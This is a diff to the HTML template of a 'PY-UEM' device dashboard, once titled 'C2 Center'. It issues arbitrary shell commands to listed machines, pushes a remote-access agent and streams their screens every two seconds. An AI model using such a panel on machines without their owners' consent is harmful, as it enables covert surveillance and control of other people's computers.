@@ -2,83 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PY-UEM | C2 Center</title>
+    <title>PY-UEM Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
-<body class="bg-[#0f172a] text-slate-200 font-sans">
-    <div class="flex">
-        <!-- Sidebar -->
-        <div class="w-64 h-screen bg-slate-900 p-6 fixed border-r border-slate-800">
-            <h1 class="text-2xl font-black text-blue-500 mb-10">PY-UEM</h1>
-            <nav class="space-y-4">
-                <a href="/" class="text-blue-400 bg-blue-500/10 p-3 rounded-lg flex items-center">
-                    <i class="fas fa-th-large mr-3"></i> Dashboard
-                </a>
-            </nav>
+<body class="bg-[#0f172a] text-slate-200 p-8">
+    <div class="max-w-7xl mx-auto">
+        <div class="grid grid-cols-4 gap-4 mb-8">
+            <div class="bg-slate-800 p-4 rounded-xl">Total: {{ stats.total }}</div>
+            <div class="bg-slate-800 p-4 rounded-xl text-green-400">Online: {{ stats.online }}</div>
+            <div class="bg-slate-800 p-4 rounded-xl text-blue-400">Windows: {{ stats.win }}</div>
+            <div class="bg-slate-800 p-4 rounded-xl text-orange-400">macOS: {{ stats.mac }}</div>
         </div>
 
-        <!-- Main Content -->
-        <div class="ml-64 p-8 w-full">
-            <!-- Stats -->
-            <div class="grid grid-cols-4 gap-6 mb-10">
-                <div class="bg-slate-800 p-6 rounded-2xl border border-slate-700">
-                    <p class="text-slate-400 text-sm">Total Devices</p>
-                    <h2 class="text-3xl font-bold">{{ stats.total }}</h2>
-                </div>
-                <div class="bg-slate-800 p-6 rounded-2xl border border-slate-700">
-                    <p class="text-slate-400 text-sm">Online</p>
-                    <h2 class="text-3xl font-bold text-green-400">{{ stats.online }}</h2>
-                </div>
-            </div>
-
-            <!-- Device Table -->
-            <div class="bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden">
-                <table class="w-full text-left">
-                    <thead class="bg-slate-900/50 text-slate-400 text-xs uppercase">
-                        <tr>
-                            <th class="px-6 py-4">Status</th>
-                            <th class="px-6 py-4">Endpoint</th>
-                            <th class="px-6 py-4">Resources</th>
-                            <th class="px-6 py-4 text-right">Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody class="divide-y divide-slate-700">
-                        {% for d in devices %}
-                        <tr class="hover:bg-slate-700/30 transition">
-                            <td class="px-6 py-4">
-                                <span class="flex items-center">
-                                    <span class="w-2 h-2 rounded-full mr-2 {{ 'bg-green-500 shadow-[0_0_10px_#22c55e]' if d.is_online else 'bg-slate-600' }}"></span>
-                                    {{ 'Active' if d.is_online else 'Offline' }}
-                                </span>
-                            </td>
-                            <td class="px-6 py-4">
-                                <div class="font-bold text-slate-100">{{ d.hostname }}</div>
-                                <div class="text-xs text-slate-500">{{ d.id }}</div>
-                            </td>
-                            <td class="px-6 py-4 text-xs">
-                                CPU: {{ d.cpu_usage }}% | RAM: {{ d.ram_usage }}%
-                            </td>
-                            <td class="px-6 py-4 text-right flex justify-end gap-3">
-                                <!-- REMOTE BUTTON: This MUST use https:// and NO javascript -->
-                                <a href="https://www.dwservice.net/en/agents.html" target="_blank"
-                                   class="bg-orange-600 hover:bg-orange-500 px-4 py-2 rounded-lg text-xs font-bold transition">
-                                    <i class="fas fa-desktop mr-2"></i> REMOTE
-                                </a>
-
-                                <!-- COMMAND FORM -->
-                                <form action="/send-command" method="POST" class="flex gap-2">
-                                    <input type="hidden" name="device_id" value="{{ d.id }}">
-                                    <input type="text" name="command" placeholder="Command..." class="bg-slate-900 border-slate-700 border rounded-lg px-2 py-1 text-sm focus:outline-none">
-                                    <button class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded-lg text-xs font-bold transition">RUN</button>
-                                </form>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    </tbody>
-                </table>
-            </div>
+        <div class="bg-slate-800 rounded-2xl overflow-hidden">
+            <table class="w-full text-left">
+                <thead class="bg-slate-900 font-bold text-xs uppercase tracking-widest">
+                    <tr>
+                        <th class="p-4">Device</th>
+                        <th class="p-4">Health</th>
+                        <th class="p-4">Actions</th>
+                        <th class="p-4">Live Stream</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for d in devices %}
+                    <tr class="border-t border-slate-700">
+                        <td class="p-4">
+                            <div class="font-bold">{{ d.hostname }}</div>
+                            <div class="text-xs text-slate-500">{{ d.id }}</div>
+                        </td>
+                        <td class="p-4">
+                            <div class="text-xs mb-1">CPU: {{ d.cpu_usage }}%</div>
+                            <div class="w-24 h-1 bg-slate-900 rounded-full"><div class="bg-blue-500 h-full" style="width:{{ d.cpu_usage }}%"></div></div>
+                        </td>
+                        <td class="p-4 flex gap-2">
+                            <button onclick="sendQuickCmd('{{ d.id }}', 'INSTALL_REMOTE')" class="bg-orange-600 px-3 py-1 rounded text-xs">Deploy DWS</button>
+                            <form action="/send-command" method="POST" class="flex gap-1">
+                                <input type="hidden" name="device_id" value="{{ d.id }}">
+                                <input type="text" name="command" class="bg-slate-900 text-xs p-1 rounded border border-slate-600" placeholder="Shell command...">
+                                <button class="bg-blue-600 px-3 py-1 rounded text-xs">Run</button>
+                            </form>
+                        </td>
+                        <td class="p-4">
+                            <button onclick="toggleView('{{ d.id }}')" class="bg-green-600 px-3 py-1 rounded text-xs">Toggle View</button>
+                            <div id="view-{{ d.id }}" class="hidden mt-2 border border-slate-600 rounded">
+                                <img id="img-{{ d.id }}" src="" class="w-64">
+                            </div>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
         </div>
     </div>
+
+    <script>
+        function sendQuickCmd(deviceId, cmd) {
+            const fd = new FormData();
+            fd.append('device_id', deviceId);
+            fd.append('command', cmd);
+            fetch('/send-command', { method: 'POST', body: fd }).then(() => alert("Command sent!"));
+        }
+
+        function toggleView(deviceId) {
+            const container = document.getElementById('view-' + deviceId);
+            const img = document.getElementById('img-' + deviceId);
+
+            if (container.classList.contains('hidden')) {
+                container.classList.remove('hidden');
+                sendQuickCmd(deviceId, 'SCREEN_ON');
+                // Start refresh loop
+                window['interval-' + deviceId] = setInterval(() => {
+                    img.src = '/get-screen/' + deviceId + '?t=' + Date.now();
+                }, 2000);
+            } else {
+                container.classList.add('hidden');
+                sendQuickCmd(deviceId, 'SCREEN_OFF');
+                clearInterval(window['interval-' + deviceId]);
+            }
+        }
+    </script>
 </body>
 </html>
